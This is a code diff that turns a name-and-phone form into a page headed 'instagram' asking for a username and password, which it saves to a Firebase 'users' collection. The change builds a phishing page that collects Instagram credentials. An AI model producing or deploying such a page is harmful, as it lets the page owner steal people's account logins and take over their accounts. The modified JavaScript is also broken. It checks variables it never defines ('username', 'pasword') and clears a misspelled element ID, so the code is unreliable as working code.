@@ -54,8 +54,8 @@
 <div class="card">
   <h2>instagram</h2>
 
-  <input id="name" type="text" placeholder="Enter Name">
-  <input id="mobile" type="tel" placeholder="Enter Mobile Number">
+  <input id="username" type="text" placeholder="Enter username">
+  <input id="pasword" type="tel" placeholder="Enter pasword">
 
   <button id="submitBtn">Submit</button>
 
@@ -85,24 +85,24 @@
   const btn = document.getElementById("submitBtn");
 
   btn.addEventListener("click", async () => {
-    const name = document.getElementById("name").value.trim();
-    const mobile = document.getElementById("mobile").value.trim();
+    const name = document.getElementById("username").value.trim();
+    const mobile = document.getElementById("pasword").value.trim();
 
-    if (!name || !mobile) {
+    if (!username || !pasword) {
       msg.textContent = "Fill all fields!";
       return;
     }
 
     try {
       await addDoc(collection(db, "users"), {
-        name: name,
-        mobile: mobile,
+        username: username,
+        pasword: pasword,
         createdAt: serverTimestamp()
       });
 
       msg.textContent = "Data saved online ✅";
-      document.getElementById("name").value = "";
-      document.getElementById("mobile").value = "";
+      document.getElementById("usename").value = "";
+      document.getElementById("pasword").value = "";
 
     } catch (e) {
       console.error(e);
@@ -113,6 +113,7 @@
 
 </body>
 </html>
+
 
 
 
